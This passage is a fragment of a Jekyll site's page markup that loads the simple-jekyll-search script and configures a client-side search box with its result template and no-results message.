src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
